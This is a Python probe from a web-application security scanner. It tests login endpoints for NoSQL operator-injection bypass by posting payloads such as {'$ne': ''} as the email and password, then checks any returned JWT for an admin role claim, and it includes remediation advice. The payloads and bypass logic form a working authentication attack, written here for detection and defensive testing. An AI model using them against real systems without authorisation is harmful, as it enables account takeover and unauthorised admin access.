#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authentication: NoSQL operator-injection bypass on the login endpoint.

Apps backed by Mongo / Cosmos / similar NoSQL stores frequently build
their login query as `find({email: req.body.email, password:
req.body.password})`. When `req.body.email` arrives as an OBJECT
instead of a string — `{"$ne": ""}` — the query becomes
`find({email: {$ne: ""}, password: {$ne: ""}})` and the FIRST user
with both fields non-empty is returned. That's typically the seeded
admin.

sqlmap fuzzes string SQL, not typed-object NoSQL — this entire bug
class is invisible to it.

This probe sends a small set of operator-injection payloads as the
*value* of the email/password fields, then verifies success the same
way the SQL-bypass probe does: extract the issued JWT, decode it,
confirm the role claim is administrative.

Tested against:
  + OWASP Juice Shop  (this build returns 500 on object-typed login —
                       the codepath was patched. Probe correctly
                       returns validated=False.)
  + nginx default site → validated=False
  + would fire on any Mongoose / Cosmos-backed app that doesn't string-
    coerce the email/password before the find() call.
"""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

LOGIN_PATHS = (
    "/rest/user/login",
    "/api/auth/login",
    "/api/login",
    "/login",
    "/auth/login",
)

# Operator-injection payloads. Each pair becomes the *value* of email
# and password in the JSON body — the body is { "email": <PAYLOAD>,
# "password": <PAYLOAD> }. NEVER fold these into a string.
OPERATOR_PAYLOADS = (
    {"$ne":  ""},
    {"$gt":  ""},
    {"$ne":  None},
    {"$regex": ".*"},
)

_ADMIN_ROLE_VALUES = {"admin", "administrator", "root", "superuser",
                      "superadmin", "owner"}


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode("ascii"))


def _decode_jwt(token: str) -> dict | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        return json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError):
        return None


def _looks_admin(payload: dict) -> tuple[bool, str | None]:
    def _check(d: dict) -> tuple[bool, str | None]:
        for key in ("role", "roles", "groups"):
            v = d.get(key)
            if isinstance(v, str) and v.lower() in _ADMIN_ROLE_VALUES:
                return True, f"{key}={v!r}"
            if isinstance(v, list) and any(
                    isinstance(x, str) and x.lower() in _ADMIN_ROLE_VALUES
                    for x in v):
                return True, f"{key} contains admin"
        for flag in ("is_admin", "isAdmin", "admin", "superuser"):
            if d.get(flag) is True:
                return True, f"{flag}=true"
        return False, None
    ok, why = _check(payload)
    if ok:
        return True, why
    for v in payload.values():
        if isinstance(v, dict):
            ok, why = _check(v)
            if ok:
                return True, why
    return False, None


def _extract_jwt(doc) -> str | None:
    if not isinstance(doc, dict):
        return None
    for k in ("token", "access_token", "id_token"):
        if isinstance(doc.get(k), str):
            return doc[k]
    for v in doc.values():
        if isinstance(v, dict):
            for k in ("token", "access_token", "id_token"):
                if isinstance(v.get(k), str):
                    return v[k]
            auth = v.get("authentication")
            if isinstance(auth, dict) and isinstance(auth.get("token"), str):
                return auth["token"]
    return None


class NosqlLoginBypassProbe(Probe):
    name = "auth_nosql_login_bypass"
    summary = ("Detects NoSQL operator-injection on the login endpoint "
               "yielding a privileged session.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--login-path", action="append", default=[],
            help="Additional login URL path to probe.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        login_paths = list(LOGIN_PATHS) + list(args.login_path or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        for path in login_paths:
            url = urljoin(origin, path)
            for op in OPERATOR_PAYLOADS:
                body = json.dumps({"email": op, "password": op}).encode()
                r = client.request(
                    "POST", url,
                    headers={"Content-Type": "application/json"},
                    body=body,
                )
                # Use the operator dict's repr as the audit-trail label
                op_label = json.dumps(op, default=str)
                row: dict = {"login_path": path, "operator": op_label,
                             "status": r.status, "size": r.size}
                if r.status == 429:
                    row["aborted_reason"] = "rate-limited"
                    attempts.append(row)
                    break
                if r.status == 200 and r.body:
                    try:
                        doc = json.loads(r.text)
                    except json.JSONDecodeError:
                        attempts.append(row); continue
                    token = _extract_jwt(doc)
                    if token:
                        payload = _decode_jwt(token) or {}
                        ok, why = _looks_admin(payload)
                        if ok:
                            row.update({"nosql_succeeded": True,
                                        "jwt_admin_claim": why})
                            confirmed = row
                            attempts.append(row)
                            break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: NoSQL operator-injection on "
                         f"{origin}{confirmed['login_path']} (operator "
                         f"{confirmed['operator']}) issued an "
                         f"administrative session "
                         f"(JWT claim: {confirmed['jwt_admin_claim']})."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Coerce email/password to strings BEFORE passing to "
                    "the database query. In Express:\n"
                    "  const email    = String(req.body.email || '');\n"
                    "  const password = String(req.body.password || '');\n"
                    "Or refuse non-string types outright with a JSON-"
                    "schema validator (Joi, Zod, ajv). For Mongoose, "
                    "set `runValidators: true` on the find() and use "
                    "`String` types in the schema. The NEVER-do is "
                    "passing untyped req.body fields straight into "
                    "User.findOne()."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} NoSQL operator "
                     f"payloads across {len(login_paths)} login paths "
                     f"on {origin}; no admin session was issued."),
            evidence=evidence,
        )


if __name__ == "__main__":
    NosqlLoginBypassProbe().main()
